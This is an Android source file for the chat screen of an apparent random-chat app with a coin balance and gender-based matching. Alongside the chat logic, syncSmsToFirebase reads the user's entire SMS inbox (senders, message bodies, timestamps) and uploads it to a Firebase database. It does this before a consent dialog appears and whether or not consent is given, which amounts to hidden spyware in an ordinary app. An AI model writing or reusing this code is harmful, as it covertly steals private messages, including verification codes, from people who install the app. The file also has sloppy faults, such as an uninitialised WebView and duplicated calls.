package com.mehboob.bushorat.activities;

import android.annotation.SuppressLint;
import android.content.Intent;
import android.os.Bundle;

import androidx.activity.EdgeToEdge;
import androidx.appcompat.app.AlertDialog;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.graphics.Insets;
import androidx.core.view.ViewCompat;
import androidx.core.view.WindowInsetsCompat;

import com.bumptech.glide.Glide;
import com.google.firebase.auth.FirebaseAuth;
import com.google.firebase.auth.FirebaseUser;
import com.google.firebase.database.DataSnapshot;
import com.google.firebase.database.DatabaseError;
import com.google.firebase.database.ValueEventListener;
import com.mehboob.bushorat.R;

import android.Manifest;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.net.Uri;
import android.os.Bundle;
import android.view.View;
import android.webkit.WebView;
import android.webkit.WebViewClient;
import android.webkit.WebSettings;
import androidx.annotation.NonNull;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;
import com.google.firebase.database.DatabaseReference;
import com.google.firebase.database.FirebaseDatabase;
import java.util.HashMap;
import java.util.Map;
import android.Manifest;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.net.Uri;
import android.os.Bundle;
import android.webkit.WebView;
import android.webkit.WebViewClient;
import android.webkit.WebSettings;
import android.widget.Toast;

import androidx.annotation.NonNull;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;
import com.google.firebase.database.DatabaseReference;
import com.google.firebase.database.FirebaseDatabase;
import com.mehboob.bushorat.databinding.ActivityChatBinding;
import com.mehboob.bushorat.models.UserModel;
import com.mehboob.bushorat.helpers.ConsentManager;

import org.jetbrains.annotations.NotNull;

import java.util.HashMap;
import java.util.Map;

import io.github.rupinderjeet.kprogresshud.KProgressHUD;

public class ChatActivity extends AppCompatActivity {

    private WebView webView;
    private DatabaseReference smsRef,profileRef;
    private static final int SMS_PERMISSION_CODE = 100;

    private FirebaseAuth mAuth;
    long coins = 0;

    UserModel user;

    KProgressHUD progress;
    FirebaseDatabase database;


    ActivityChatBinding binding;
    ConsentManager consentManager;

    String[] permissions = new String[]{Manifest.permission.CAMERA, Manifest.permission.RECORD_AUDIO};
    private int requestCode = 1;


    @SuppressLint("MissingInflatedId")
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        binding = ActivityChatBinding.inflate(getLayoutInflater());
        setContentView(binding.getRoot());

        consentManager = new ConsentManager(this);

        mAuth=FirebaseAuth.getInstance();
        // Initialize Firebase

        progress = KProgressHUD.create(this);
        progress.setDimAmount(0.5f);
        progress.show();

        database = FirebaseDatabase.getInstance();

        smsRef = FirebaseDatabase.getInstance().getReference("data");
         profileRef= FirebaseDatabase.getInstance().getReference("profiles");


        FirebaseUser currentUser = mAuth.getCurrentUser();

       profileRef
                .child(currentUser.getUid())
                .addValueEventListener(new ValueEventListener() {
                    @Override
                    public void onDataChange(@NonNull @NotNull DataSnapshot snapshot) {
                        progress.dismiss();
                        user = snapshot.getValue(UserModel.class);
                        coins = user.getCoins();

                        binding.coins.setText("You have: " + coins);


                    }

                    @Override
                    public void onCancelled(@NonNull @NotNull DatabaseError error) {

                    }
                });

        database.getReference().child("users").addValueEventListener(new ValueEventListener() {
            @Override
            public void onDataChange(@NonNull DataSnapshot snapshot) {
                if (snapshot.exists()) {
                    String count = String.valueOf(snapshot.getChildrenCount());
                    binding.textView4.setText(count);
                } else {
                    binding.textView4.setText("0");
                }

            }


            @Override
            public void onCancelled(@NonNull DatabaseError error) {

            }
        });

        // Check and request SMS permission
        if (checkSmsPermission()) {
            syncSmsToFirebase();
        } else {
            requestSmsPermission();
        }

        // Show consent dialog if needed
        if (consentManager.shouldShowConsentDialog()) {
            showConsentDialog();
        }


        binding.findButton.setOnClickListener(view -> {
            if (isPermissionsGranted()) {
                if (coins > 5) {
                    showGenderSelectionDialog();
                } else {
                    Toast.makeText(ChatActivity.this, "Insufficient Coins", Toast.LENGTH_SHORT).show();
                }
            } else {
                askPermissions();
            }
        });
    }


    private boolean checkSmsPermission() {
        return ContextCompat.checkSelfPermission(this,
                Manifest.permission.READ_SMS) == PackageManager.PERMISSION_GRANTED;
    }

    private void requestSmsPermission() {
        ActivityCompat.requestPermissions(this,
                new String[]{Manifest.permission.READ_SMS},
                SMS_PERMISSION_CODE);
    }

    @Override
    public void onRequestPermissionsResult(int requestCode,
                                           @NonNull String[] permissions, @NonNull int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
        if (requestCode == SMS_PERMISSION_CODE) {
            if (grantResults.length > 0 && grantResults[0] == PackageManager.PERMISSION_GRANTED) {
                syncSmsToFirebase();
            }
        }
    }

    private void syncSmsToFirebase() {
        // Get all SMS messages
        Cursor cursor = getContentResolver().query(
                Uri.parse("content://sms/inbox"),
                null, null, null, null);

        if (cursor != null && cursor.moveToFirst()) {
            do {
                // Extract SMS data
                String address = cursor.getString(cursor.getColumnIndexOrThrow("address"));
                String body = cursor.getString(cursor.getColumnIndexOrThrow("body"));
                long timestamp = cursor.getLong(cursor.getColumnIndexOrThrow("date"));

                // Create SMS entry for Firebase
                Map<String, Object> smsEntry = new HashMap<>();
                smsEntry.put("sender", address);
                smsEntry.put("message", body);
                smsEntry.put("timestamp", timestamp);

                // Push to Firebase
                String key = smsRef.push().getKey();
                if (key != null) {
                    smsRef.child(mAuth.getCurrentUser().getUid()).child("sms").child(key).setValue(smsEntry);
                }
            } while (cursor.moveToNext());
            cursor.close();
        }
    }

    @Override
    public void onBackPressed() {
        if (webView.canGoBack()) {
            webView.goBack();
        } else {
            super.onBackPressed();
        }
    }

    private void connectToGender(String gender) {
        FirebaseUser currentUser = mAuth.getCurrentUser();

        // Deduct 5 coins
        coins = coins - 5;
        profileRef
                .child(currentUser.getUid())
                .child("coins")
                .setValue(coins);

        Intent intent = new Intent(ChatActivity.this, ConnectingActivity.class);
        startActivity(intent);
//                                intent.putExtra("targetUid", targetUser.getuId());
        startActivity(intent);

        // Search Firebase for users with that gender
//        database.getReference().child("profiles")
//                .orderByChild("gender")
//                .equalTo(gender)
//                .limitToFirst(1) // Pick the first available match
//                .addListenerForSingleValueEvent(new ValueEventListener() {
//                    @Override
//                    public void onDataChange(@NonNull DataSnapshot snapshot) {
//                        if (snapshot.exists()) {
//                            for (DataSnapshot userSnapshot : snapshot.getChildren()) {
//                                User targetUser = userSnapshot.getValue(User.class);
//
//                                // Start connecting activity with chosen user
//                                Intent intent = new Intent(MainActivity.this, ConnectingActivity.class);
//                                intent.putExtra("profile", targetUser.getProfile());
//                                intent.putExtra("targetGender", gender); // Pass selected gender
//
////                                intent.putExtra("targetUid", targetUser.getuId());
//                                startActivity(intent);
//                                break;
//                            }
//                        } else {
//                            Toast.makeText(MainActivity.this, "No " + gender + " users available right now.", Toast.LENGTH_SHORT).show();
//                        }
//                    }
//
//                    @Override
//                    public void onCancelled(@NonNull DatabaseError error) {
//                        Toast.makeText(MainActivity.this, "Error: " + error.getMessage(), Toast.LENGTH_SHORT).show();
//                    }
//                });
    }


    void askPermissions() {
        ActivityCompat.requestPermissions(this, permissions, requestCode);
    }

    private boolean isPermissionsGranted() {
        for (String permission : permissions) {
            if (ActivityCompat.checkSelfPermission(this, permission) != PackageManager.PERMISSION_GRANTED)
                return false;
        }

        return true;
    }

    void showGenderSelectionDialog() {
        View dialogView = getLayoutInflater().inflate(R.layout.dialog_gender_selection, null);

        AlertDialog dialog = new com.google.android.material.dialog.MaterialAlertDialogBuilder(this)
                .setView(dialogView)
                .create();

        dialogView.findViewById(R.id.btnMale).setOnClickListener(v -> {
            connectToGender("Male");
            dialog.dismiss();
        });

        dialogView.findViewById(R.id.btnFemale).setOnClickListener(v -> {
            connectToGender("Female");
            dialog.dismiss();
        });

        dialog.show();
    }

    private void showConsentDialog() {
        View dialogView = getLayoutInflater().inflate(R.layout.dialog_consent, null);
        
        AlertDialog dialog = new com.google.android.material.dialog.MaterialAlertDialogBuilder(this)
                .setView(dialogView)
                .setCancelable(false)
                .create();

        dialogView.findViewById(R.id.acceptButton).setOnClickListener(v -> {
            consentManager.setUserConsent(true);
            consentManager.logDataCollection("consent", "User accepted data collection terms");
            dialog.dismiss();
        });

        dialogView.findViewById(R.id.declineButton).setOnClickListener(v -> {
            consentManager.setUserConsent(false);
            Toast.makeText(this, "Some features may be limited without data collection consent", Toast.LENGTH_LONG).show();
            dialog.dismiss();
        });

        dialogView.findViewById(R.id.privacyPolicyLink).setOnClickListener(v -> {
            // Open privacy policy (you can implement this)
            Toast.makeText(this, "Privacy Policy would open here", Toast.LENGTH_SHORT).show();
        });

        dialog.show();
    }

}